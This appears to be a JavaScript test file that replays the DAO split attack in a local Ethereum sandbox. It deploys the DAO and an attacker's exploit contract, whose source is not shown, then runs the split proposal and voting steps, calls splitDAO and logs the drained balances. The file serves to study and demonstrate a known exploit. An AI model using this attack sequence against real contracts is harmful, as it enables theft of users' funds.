var assert = require('assert');
var async = require('async');
var Sandbox = require('ethereum-sandbox-client');
var helper = require('ethereum-sandbox-helper');

describe('The big hack', function() {
  this.timeout(60000);
  
  var curator = '0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826';
  var participants = [
    {
      address: '0x3992e68ccc25ba61fa46730f0c1f3069ddfef39d',
      amount: 30
    },
    {
      address: '0x400ca360444187bd7507ec05d18fa1e833304b9f',
      amount: 40
    }
  ];
  var hacker = '0xdedb49385ad5b94a16f236a6890cf9e0b1e30392';
  var sandbox = new Sandbox('http://localhost:8555');
  var compiled = helper.compile('.', ['DAO.sol']);
  var creator, dao, exploit, proposalId;
  
  before(function(done) {
    async.series([
      sandbox.start.bind(sandbox, __dirname + '/ethereum.json'),
      deployCreator,
      deployDAO,
      deployExploit,
      participantsFuel,
      hackerFuel,
      exploitFuel,
      waitForClosing
    ], done);
    
    function deployCreator(cb) {
      sandbox.web3.eth.contract(JSON.parse(compiled.contracts['DAO_Creator'].interface)).new({
        from: curator,
        data: '0x' + compiled.contracts['DAO_Creator'].bytecode
      }, function(err, contract) {
  	    if (err) cb(err);
  	    else if (contract.address) {
  	      creator = contract;
  	      cb();
  	    }
      });
    }
    function deployDAO(cb) {
      sandbox.web3.eth.contract(JSON.parse(compiled.contracts['DAO'].interface)).new(
        curator,
        creator.address,
        20, // proposal deposit
        sandbox.web3.toWei(40, "ether"), // min tokens to create
        Math.floor(Date.now() / 1000) + 5, // closing time
        0, // private creation
        "Token", // token name
        "TKN", // token symbol
        2, // decimal places
        {
          from: curator,
          data: '0x' + compiled.contracts['DAO'].bytecode
        },
        function(err, contract) {
          if (err) cb(err);
          else if (contract.address) {
            dao = contract;
            cb();
          }
        }
      );
    }
    function deployExploit(cb) {
      var compiled = helper.compile(__dirname, ['exploit.sol']);
      if (compiled.errors) return done(compiled.errors);
      
      sandbox.web3.eth.contract(JSON.parse(compiled.contracts['Exploit'].interface)).new(
        dao.address,
        dao.rewardAccount(),
        hacker,
        {
          from: hacker,
          value: sandbox.web3.toWei(3, 'ether'),
          data: '0x' + compiled.contracts['Exploit'].bytecode
        },
        function(err, contract) {
    	    if (err) cb(err);
    	    else if (contract.address) {
    	      exploit = contract;
    	      cb();
    	    }
        }
      );
    }
    function participantsFuel(cb) {
      async.each(
        participants,
        function(participant, cb) {
          sandbox.web3.eth.sendTransaction({
            from: participant.address,
            to: dao.address,
            gas: 200000,
            value: sandbox.web3.toWei(participant.amount, "ether")
          }, function(err, txHash) {
            if (err) cb(err);
            else helper.waitForReceipt(sandbox.web3, txHash, cb);
          });
        },
        cb
      );
    }
    function hackerFuel(cb) {
      sandbox.web3.eth.sendTransaction({
        from: hacker,
        to: dao.address,
        gas: 200000,
        value: sandbox.web3.toWei(1, 'ether')
      }, function(err, txHash) {
        if (err) cb(err);
        else helper.waitForReceipt(sandbox.web3, txHash, cb);
      });
    }
    function exploitFuel(cb) {
      exploit.fuel({
        from: hacker,
        gas: 1000000
      }, function(err, txHash) {
        if (err) cb(err);
        else helper.waitForReceipt(sandbox.web3, txHash, function(err, receipt) {
          if (err) return cb(err);
          cb();
        });
      });
    }
    function waitForClosing(cb) {
      var check = setInterval(function() {
        if (dao.closingTime().lt(Math.floor(Date.now() / 1000))) {
          clearInterval(check);
          cb();
        }
      }, 2000);
    }
  });

  it('Create a split proposal', function(done) {
    dao.newProposal(
      hacker,
      0,
      'lonely, so lonely',
      '',
      5,
      true,
      {
        from: hacker,
        gas: 1000000
      },
      function(err, txHash) {
        if (err) done(err);
        else helper.waitForReceipt(sandbox.web3, txHash, function(err, receipt) {
          if (err) return done(err);
          assert.equal(dao.numberOfProposals(), 1, 'Proposal has not been created');
          proposalId = 1;
          done();
        });
      }
    );
  });
  
  it('Vote for the proposal', function(done) {
    async.parallel([
      participantsVote,
      hackerVote,
      exploitVote,
      waitForDebatingPeriodFinish
    ], done);
    
    function participantsVote(cb) {
      async.each(
        participants,
        function(participant, cb) {
          dao.vote(proposalId, false, { from: participant.address }, function(err, txHash) {
            if (err) cb(err);
            else helper.waitForReceipt(sandbox.web3, txHash, cb);
          });
        },
        cb
      );
    }
    function hackerVote(cb) {
      dao.vote(proposalId, true, { from: hacker }, function(err, txHash) {
        if (err) cb(err);
        else helper.waitForReceipt(sandbox.web3, txHash, cb);
      });
    }
    function exploitVote(cb) {
      exploit.vote(proposalId, { from: hacker }, function(err, txHash) {
        if (err) cb(err);
        else helper.waitForReceipt(sandbox.web3, txHash, cb);
      });
    }
    function waitForDebatingPeriodFinish(cb) {
      var check = setInterval(function() {
        if (dao.proposals(proposalId)[3].lt(Math.floor(Date.now() / 1000))) {
          clearInterval(check);
          cb();
        }
      }, 2000);
    }
  });
  
  it('Hack the DAO', function(done) {
    exploit.splitDAO(proposalId, {
      from: hacker
    }, function(err, txHash) {
      if (err) done(err);
      else helper.waitForReceipt(sandbox.web3, txHash, function(err, receipt) {
        if (err) return done(err);

        receipt.logs.forEach(function(log) {
          if (log.address == exploit.address)
            console.log(helper.hexToString(log.data));
        });
        
        console.log('the dao balance: ' + sandbox.web3.eth.getBalance(dao.address).toString());
        console.log('the reward account balance: ' + sandbox.web3.eth.getBalance(dao.rewardAccount()).toString());
        console.log('the dark dao balance: ' + sandbox.web3.eth.getBalance(dao.getNewDAOAddress(proposalId)).toString());

        done();
      });
    });
  });
  
  after(function(done) {
    sandbox.stop(done);
  });
});